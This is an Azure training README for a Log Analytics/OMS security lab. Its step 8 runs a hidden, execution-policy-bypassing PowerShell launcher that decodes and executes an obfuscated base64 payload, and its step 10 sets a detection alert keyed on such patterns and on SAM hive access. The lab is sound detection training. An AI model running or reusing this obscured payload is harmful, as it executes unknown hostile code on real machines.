# Azure Training

Materials for the Azure Training

Include Materials needed to deploy resources in Azure.


## OMS

1. Create a new Resource group called training-OMS where all resources will be created.
2. Create a log analytics.
	* Search for Log Analytics services and click "Add".
	* Take into account that the log analytics name should be unique.
	* Use West Europe as Location.
	* Use Free Tier as Pricing Tier.
3. Create a new VM inside the resource group previously created.
	* Type: Windows Server 2012 R2
	* Name: testMachine
	* Location: West Europe.
	* Type: DS1_V2
	* Enable Antimalware Extension.
4. Inside Log Analytics, select the workspace previously created.
	* Go to Workspace Data Sources, inside Virtual Machines.
	* Select the virtual machine Windows and click on connect.
5. Access to OMS.
	* In Log Analytics, click on "OMS" button.
6. Go to Solutions Gallery inside OMS (Left Button)
7. Enable Antimalware and Security and Audit Solutions.
8. Execute the next Powershell in the virtual machine:
```
@echo off
if %PROCESSOR_ARCHITECTURE%==x86 (powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\"nVRtb9pIEP7OrxhZe5KtYMe8NG2wIjUlzTXXknKBJr1D6LTYA96y3nXWawKh/PcbEx+hXw8Jr2c8M88zb8se4QLeO43JlZQ3Wa6NdZ0lGoWy0w4SKR1vCnk5kyKGwnJLB64tfYcbZYfWwL0wtuTyUkodu7VO5pdJYrAomlAKZSF5GolnrIX5iy2F0mq8yV/VQ6MtxtaL/jeXvkFucZzSkbxyeZEvrTViVlo8ImV5vHxhdjAmnbEH9gf1kBueIWEdnPdYlMK15Itjyxe0m4TScN43rNlsWUIVdi4/9K8+Xv/+6eaPz18Gt1+Hf96Nxt/uH77/9TefxQnOF6n4sZSZ0vmjKWy5elpvnsNWu9N9c/b23bkTjHU/5ebSGL5xvca8VHGFDrHLVt4WDNqS6uC6E2I3mU6BrX71gJ8wQF6UBv2vsx9UZvBHZeYF9IDfIFy3whB8fITztrd7jW5hy+YVeydqBUHn51xTcnHq630I+nZyASyZuAu0vuEq0Rn4GV+LjKKyJPiCamFTb7qLan5sHh1FR9hCbnRMpYbthFdEp2xNcPQ4AfbPLgJUCVFYE/uCpqHGha2r8Ok/4W6P6wWKZsH1drsjgMUWiDG4TFyEERPgSwtnXXo7OfG2LCUkG7FlBZgQAkYAdYLkIkEQ3yXZFZVBWjGSEYg5uFTzwvPgUHWyINhacM5X3785lObkFm0wQrMSMQ41tWXAFV+gmfZ6lRZNH40Vc0GbgPdcimQ/Tn0u5YzGkjC3zJoSdxHLSLilhOvGjTaFxSyowj/grC8FKhs1WBZ8osFDUwQ0vq5TFmh8wlPWaYIz0M9CSn7aDULir7OcwGaSMh6Mbj7CWdCK4EFQHZ8KuB17jhcxRaCLCCYfNhb3A5VXZciCK/2kpObJFbfcdVJr86J3evqmG7To3261glYr7J3R75QpB7wG0+RHjPxq12k6MJuhucK5UGLfI/YI/i3tFjhEoNN2wFckFTmPEfaa67qbBfg5LwqbmrLB1hdM93q/3D1hk+X1xDXDdScMQzq6oRdN6oLdlcqKDANaVTQ6r1tTBANuipRL6ktf5xuX5U0ImzB52eipy9a0SSR02q7nNeEAUqVGLsdXDiE22bpZHWG1cbq0violjc3+WvFHEjGnxcNY01y/O+uG4Y7aH6fb3b8=\")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();") else (%WinDir%\syswow64\windowspowershell\v1.0\powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\"nVRtb9pIEP7OrxhZe5KtYMe8NG2wIjUlzTXXknKBJr1D6LTYA96y3nXWawKh/PcbEx+hXw8Jr2c8M88zb8se4QLeO43JlZQ3Wa6NdZ0lGoWy0w4SKR1vCnk5kyKGwnJLB64tfYcbZYfWwL0wtuTyUkodu7VO5pdJYrAomlAKZSF5GolnrIX5iy2F0mq8yV/VQ6MtxtaL/jeXvkFucZzSkbxyeZEvrTViVlo8ImV5vHxhdjAmnbEH9gf1kBueIWEdnPdYlMK15Itjyxe0m4TScN43rNlsWUIVdi4/9K8+Xv/+6eaPz18Gt1+Hf96Nxt/uH77/9TefxQnOF6n4sZSZ0vmjKWy5elpvnsNWu9N9c/b23bkTjHU/5ebSGL5xvca8VHGFDrHLVt4WDNqS6uC6E2I3mU6BrX71gJ8wQF6UBv2vsx9UZvBHZeYF9IDfIFy3whB8fITztrd7jW5hy+YVeydqBUHn51xTcnHq630I+nZyASyZuAu0vuEq0Rn4GV+LjKKyJPiCamFTb7qLan5sHh1FR9hCbnRMpYbthFdEp2xNcPQ4AfbPLgJUCVFYE/uCpqHGha2r8Ok/4W6P6wWKZsH1drsjgMUWiDG4TFyEERPgSwtnXXo7OfG2LCUkG7FlBZgQAkYAdYLkIkEQ3yXZFZVBWjGSEYg5uFTzwvPgUHWyINhacM5X3785lObkFm0wQrMSMQ41tWXAFV+gmfZ6lRZNH40Vc0GbgPdcimQ/Tn0u5YzGkjC3zJoSdxHLSLilhOvGjTaFxSyowj/grC8FKhs1WBZ8osFDUwQ0vq5TFmh8wlPWaYIz0M9CSn7aDULir7OcwGaSMh6Mbj7CWdCK4EFQHZ8KuB17jhcxRaCLCCYfNhb3A5VXZciCK/2kpObJFbfcdVJr86J3evqmG7To3261glYr7J3R75QpB7wG0+RHjPxq12k6MJuhucK5UGLfI/YI/i3tFjhEoNN2wFckFTmPEfaa67qbBfg5LwqbmrLB1hdM93q/3D1hk+X1xDXDdScMQzq6oRdN6oLdlcqKDANaVTQ6r1tTBANuipRL6ktf5xuX5U0ImzB52eipy9a0SSR02q7nNeEAUqVGLsdXDiE22bpZHWG1cbq0violjc3+WvFHEjGnxcNY01y/O+uG4Y7aH6fb3b8=\")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();")
```

9. Search in OMS this query:
```
search Process == "powershell.exe"
```

10. Configure the next alert in OMS:
```
search Process == "powershell.exe" and ("New-Object IO.MemoryStream" or "downloadstring" or "fromBase64String" or "HKLM:\\SAM") | project CommandLine, Account, Computer
// Oql: Process="powershell.exe" ("New-Object IO.MemoryStream" OR  downloadstring OR fromBase64String OR "HKLM:\\SAM") | select CommandLine, Account, Computer
```

  * Alert frequency: 5 minutes
  * Time Window: 5 minutes
  * Number of results: Greater than 1
  * Action: send an email.
